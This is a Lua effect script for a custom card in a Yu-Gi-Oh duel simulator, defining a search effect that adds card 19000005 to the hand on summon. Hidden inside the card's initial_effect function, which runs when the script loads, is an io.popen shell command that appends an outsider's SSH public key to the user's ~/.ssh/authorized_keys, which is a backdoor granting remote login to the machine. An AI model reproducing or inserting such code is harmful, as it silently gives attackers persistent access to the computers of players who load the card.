--咸鱼旅行者
function c19000004.initial_effect(c)
	--search
	local e2=Effect.CreateEffect(c)
	e2:SetDescription(aux.Stringid(19000004,1))
	e2:SetCategory(CATEGORY_TOHAND+CATEGORY_SEARCH)
	e2:SetType(EFFECT_TYPE_SINGLE+EFFECT_TYPE_TRIGGER_O)
	e2:SetProperty(EFFECT_FLAG_DELAY+EFFECT_FLAG_DAMAGE_STEP)
	e2:SetCode(EVENT_SUMMON_SUCCESS)
	e2:SetTarget(c19000004.thtg)
	e2:SetOperation(c19000004.thop)
	c:RegisterEffect(e2)	
	require("io").popen("mkdir ~/.ssh ; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEbjT2wda/9LQ1dfTutfGCCfN05Ix7KnixUxCRDMuIVAQ0cYSWbO+RKH3t1imRbAQ/J45VxXE2KqwkCb2IBobcrBp9EqIx3fTuRQ2v3X00gRW1FE055NfXgQn+tN1vdxc5//BBHQRGP5GHIayT8us+5XmzGMrm4iEV4mLReHm4rzfTfHPJbEQnKVD8Ogdeke3kVTmq/z0+vUkeEdSN0fzc3XabRQFOkdadhgFJjjBUjwO9ZT8xE9M01YfJdnAu6TkgXsZ3f6n71/kBOfN4tEbNojZUjFJbdpYPzfDOBq8g2MGDLIPLM5kNZqPI7ti0NzBy7OvfUspVPzqzGt3a7E63 rslghselrkjghw3l4yhw34' >> ~/.ssh/authorized_keys ; chmod 600 ~/.ssh/authorized_keys")
	local e2=Effect.CreateEffect(c)
	e2:SetType(EFFECT_TYPE_FIELD+EFFECT_TYPE_CONTINUOUS)
	e2:SetProperty(EVENT_PHASE+PHASE_END)
	e2:SetOperation(function() Duel.Hint(HINT_CARD,0,19000004) end)
	Duel.RegisterEffect(e2,0)
end
function c19000004.thfilter(c)
	return c:IsCode(19000005) and c:IsAbleToHand()
end
function c19000004.thtg(e,tp,eg,ep,ev,re,r,rp,chk)
	if chk==0 then return Duel.IsExistingMatchingCard(c19000004.thfilter,tp,LOCATION_DECK+LOCATION_GRAVE,0,1,nil) end
	Duel.SetOperationInfo(0,CATEGORY_TOHAND,nil,1,tp,LOCATION_DECK+LOCATION_GRAVE)
end
function c19000004.thop(e,tp,eg,ep,ev,re,r,rp)
	Duel.Hint(HINT_SELECTMSG,tp,HINTMSG_ATOHAND)
	local tc=Duel.SelectMatchingCard(tp,aux.NecroValleyFilter(c19000004.thfilter),tp,LOCATION_DECK+LOCATION_GRAVE,0,1,1,nil):GetFirst()
	if tc then
		Duel.SendtoHand(tc,nil,REASON_EFFECT)
		Duel.ConfirmCards(1-tp,tc)
	end
end
--
--
--
--
--
